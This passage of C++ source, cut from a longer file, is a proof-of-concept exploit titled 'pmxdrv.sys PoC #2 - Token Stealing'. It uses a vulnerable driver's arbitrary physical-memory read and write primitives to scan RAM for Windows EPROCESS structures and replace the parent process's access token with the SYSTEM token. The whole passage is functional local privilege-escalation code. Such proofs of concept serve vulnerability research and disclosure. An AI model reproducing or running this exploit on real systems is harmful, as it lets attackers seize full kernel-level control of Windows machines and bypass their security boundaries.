    const std::vector<EPROCESS_CANDIDATE>& candidates,
    EPROCESS_CANDIDATE* systemProcess,
    EPROCESS_CANDIDATE* parentProcess,
    DWORD parentPid,
    const char* parentImage)
{
    if (!systemProcess || !parentProcess || !parentImage)
        return FALSE;

    const EPROCESS_CANDIDATE* systemMatch = NULL;
    const EPROCESS_CANDIDATE* parentMatch = NULL;
    SIZE_T systemMatchCount = 0;
    SIZE_T parentMatchCount = 0;

    for (const EPROCESS_CANDIDATE& candidate : candidates) {
        if (candidate.Pid == 4 &&
            ImageEquals(candidate.ImageFileName, "System")) {
            systemMatch = &candidate;
            systemMatchCount++;
        }

        if (candidate.Pid == parentPid &&
            ImageEquals(candidate.ImageFileName, parentImage)) {
            parentMatch = &candidate;
            parentMatchCount++;
        }
    }

    printf("[*] Target resolution:\n");
    printf("    SYSTEM:  %zu match%s\n", systemMatchCount, systemMatchCount == 1 ? "" : "es");
    printf("    Parent:  %zu match%s\n", parentMatchCount, parentMatchCount == 1 ? "" : "es");

    // Fail when more than one SYSTEM or parent process found
    if (systemMatchCount != 1 || parentMatchCount != 1) {
        printf("[-] Unique SYSTEM/parent process correlation was not established\n");
        return FALSE;
    }

    // Fail when parent process == SYSTEM
    if (systemMatch->EprocessPhysicalAddress == parentMatch->EprocessPhysicalAddress) {
        printf("[-] SYSTEM and parent process candidates unexpectedly overlap\n");
        return FALSE;
    }

    // Copy the matched candidates before printing them and returning
    *systemProcess = *systemMatch;
    *parentProcess = *parentMatch;

    printf("[+] Unique physical addresses resolved\n");
    printf("    SYSTEM EPROCESS PA:     0x%016llX\n", (unsigned long long)systemProcess->EprocessPhysicalAddress);
    printf("    Parent EPROCESS PA:     0x%016llX\n", (unsigned long long)parentProcess->EprocessPhysicalAddress);

    return TRUE;
}

//**************************************************************************************************************
// STAGE 7: Overwrite parent process token
//**************************************************************************************************************

// Wrapper for arbitrary physical write primitive.
// Maps the page containing the requested physical address, modifies the mapped bytes, issues a memory barrier, and unmaps the view.
static BOOL WritePhysicalMemory(
    HANDLE driver,
    UINT64 physicalAddress,
    const void* input,
    SIZE_T size)
{
    // Rejects a range whose final address would overflow UINT64
    if (!input || size == 0 || physicalAddress > UINT64_MAX - (UINT64)(size - 1))
        return FALSE;

    // Expand the byte range to all pages it touches.
    // The mapping API accepts a page-aligned starting address and a count of complete pages.
    UINT64 startPage = physicalAddress & ~(PAGE_SIZE_BYTES - 1);

    // Find the final requested byte, then align its address down to its page
    UINT64 lastAddress = physicalAddress + size - 1;
    UINT64 endPage = lastAddress & ~(PAGE_SIZE_BYTES - 1);

    // Count both the starting page and the final page
    UINT64 pages64 = ((endPage - startPage) / PAGE_SIZE_BYTES) + 1;

    // MapPhysicalMemory accepts the page count as a DWORD
    if (pages64 == 0 || pages64 > MAXDWORD)
        return FALSE;

    // The returned address is the start of a user-mode view of those pages
    UINT64 mapped = MapPhysicalMemory(driver, startPage, (DWORD)pages64);
    if (!mapped)
        return FALSE;

    // Move from the beginning of the mapped view to the requested byte offset
    SIZE_T offset = (SIZE_T)(physicalAddress - startPage);
    BOOL success = TRUE;

    // The mapped address might be inaccessible, so catch a fault during the copy
    __try {
        memcpy((void*)(uintptr_t)(mapped + offset), input, size);

        // Order the write before subsequent memory operations
        MemoryBarrier();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception writing mapped memory (0x%08lX)\n", GetExceptionCode());
        success = FALSE;
    }

    // Release the view on both the normal and exception paths
    if (!UnmapPhysicalMemory(mapped))
        success = FALSE;

    return success;
}

// Helper to read one eight-byte field through the existing physical-read helper
static BOOL ReadQword(HANDLE driver, UINT64 physicalAddress, UINT64* value)
{
    return value && ReadPhysicalMemory(driver, physicalAddress, value, sizeof(*value));
}

// Writes an eight-byte token value and immediately reads it back.
// Distinguish between a failed write attempt from a write whose read-back was unexpected.
static TokenWriteResult WriteTokenAndVerifyPointer(
    HANDLE driver,
    UINT64 physicalAddress,
    UINT64 tokenRefToWrite)
{
    if (!WritePhysicalMemory(driver, physicalAddress, &tokenRefToWrite, sizeof(tokenRefToWrite)))
        return TokenWriteResult::WriteFailed;

    UINT64 tokenRefReadBack = 0;

    if (!ReadQword(driver, physicalAddress, &tokenRefReadBack))
        return TokenWriteResult::VerifyFailed;

    // A token reference contains a token pointer and four low bits used for cached references.
    // Windows may change those low bits after the write.
    // Compare only the token pointers to check that the intended token was written.
    if ((tokenRefReadBack & EX_FAST_REF_POINTER_MASK) != (tokenRefToWrite & EX_FAST_REF_POINTER_MASK))
        return TokenWriteResult::VerifyFailed;

    return TokenWriteResult::Success;
}

// Overwrites the parent process's EPROESS.Token with SYSTEM's
static BOOL OverwriteProcessToken(
    HANDLE driver,
    const EPROCESS_CANDIDATE& systemProcess,
    const EPROCESS_CANDIDATE& parentProcess)
{
    const UINT64 parentTokenPhysicalAddress = parentProcess.EprocessPhysicalAddress + EPROCESS_TOKEN;
    const UINT64 systemTokenRef = systemProcess.TokenRaw;
    const UINT64 parentTokenRef = parentProcess.TokenRaw;

    printf("    Parent PID:        %llu\n", (unsigned long long)parentProcess.Pid);
    printf("    Parent Image:      %s\n", parentProcess.ImageFileName);
    printf("    Parent Token PA:   0x%016llX\n", (unsigned long long)parentTokenPhysicalAddress, EPROCESS_TOKEN);
    printf("    Parent Token:      0x%016llX  (EX_FAST_REF currently in parent process)\n", (unsigned long long)parentTokenRef);
    printf("    SYSTEM Token:      0x%016llX  (EX_FAST_REF to install)\n", (unsigned long long)systemTokenRef);
    printf("[*] Overwriting the parent process's token with SYSTEM's token...\n");

    TokenWriteResult result = WriteTokenAndVerifyPointer(driver, parentTokenPhysicalAddress, systemTokenRef);

    // No rollback attempt when write fails
    if (result == TokenWriteResult::WriteFailed) {
        printf("[-] Failed to write token. No roll back required.\n");
        return FALSE;
    }

    // Attempts rollback when token written but read-back fails.
    // Reports if rollback attempt also fails.
    if (result == TokenWriteResult::VerifyFailed) {
        printf("[-] Token written but verification failed. Restoring parent process' token.\n");
        TokenWriteResult rollback = WriteTokenAndVerifyPointer(
            driver, parentTokenPhysicalAddress, parentTokenRef);

        if (rollback != TokenWriteResult::Success) {
            printf("[-] CRITICAL: Rollback also failed (%s). Parent process token state cannot be determined.\n",
                rollback == TokenWriteResult::WriteFailed
                ? "Write failed"
                : "Verification failed");
        }
        return FALSE;
    }

    printf("[+] Token overwrite verified\n");
    printf("[+] Parent %s (PID %llu) now holds SYSTEM's token\n",
        parentProcess.ImageFileName,
        (unsigned long long)parentProcess.Pid);
    printf("[*] Run `whoami` in this console to confirm.\n");
    return TRUE;
}

int main(void)
{
    printf("============================================================\n");
    printf("pmxdrv.sys PoC #2 - Token Stealing\n");
    printf("============================================================\n");

    // ---- Stage 1 ----
    PrintStage(1, "Validate target environment");
    if (!VerifyTargetBuild()) {
        printf("[-] OS build check failed\n");
        return 1;
    }
    printf("[+] OS build check passed\n");

    // ---- Stage 2 ----
    PrintStage(2, "Resolve parent process");

    DWORD parentPid = 0;
    char parentImage[EPROCESS_IMAGE_LENGTH + 1] = {};
    if (!GetParentProcessInfo(&parentPid, parentImage)) {
        printf("[-] Parent process identity was not resolved. Aborting.\n");
        return 1;
    }
    printf("[+] Parent process: PID %lu, image %s\n",
        (unsigned long)parentPid, parentImage);

    // ---- Stage 3 ----
    PrintStage(3, "Open vulnerable driver and test read primitive");

    HANDLE driver = OpenDriver();
    if (driver == INVALID_HANDLE_VALUE)
        return 1;

    printf("[*] Testing a read from physical address 0x1000...\n");
    BYTE test[16] = {};
    if (!ReadPhysicalMemory(driver, 0x1000, test, sizeof(test))) {
        printf("[-] Primitive test failed\n");
        CloseHandle(driver);
        return 1;
    }
    printf("[+] Physical memory read succeeded\n");

    // ---- Stage 4 ----
    PrintStage(4, "Read Windows-described physical memory ranges");
    std::vector<PHYSICAL_RANGE> ranges;
    if (!LoadPhysicalMemoryRanges(&ranges)) {
        printf("[-] Fail to load physical memory ranges\n");
        CloseHandle(driver);
        return 1;
    }

    // ---- Stage 5 ----
    PrintStage(5, "Scan RAM for validated EPROCESS candidates");
    std::vector<EPROCESS_CANDIDATE> candidates;
    BOOL scanComplete = FindEprocessCandidates(
        driver,
        ranges,
        &candidates);

    if (!scanComplete) {
        printf("[-] The RAM scan was incomplete\n");
        CloseHandle(driver);
        return 1;
    }

    // ---- Stage 6 ----
    PrintStage(6, "Resolve SYSTEM and parent process phyiscal address");

    EPROCESS_CANDIDATE systemProcess = {};
    EPROCESS_CANDIDATE parentProcess = {};
    BOOL targetsFound = ResolveSystemAndParentTargets(
        candidates,
        &systemProcess,
        &parentProcess,
        parentPid,
        parentImage);

    // ---- Stage 7 ----
    PrintStage(7, "Overwrite parent process token");

    BOOL success = FALSE;
    if (targetsFound) {
        success = OverwriteProcessToken(
            driver,
            systemProcess,
            parentProcess);
    }

    CloseHandle(driver);

    return success ? 0 : 1;
}
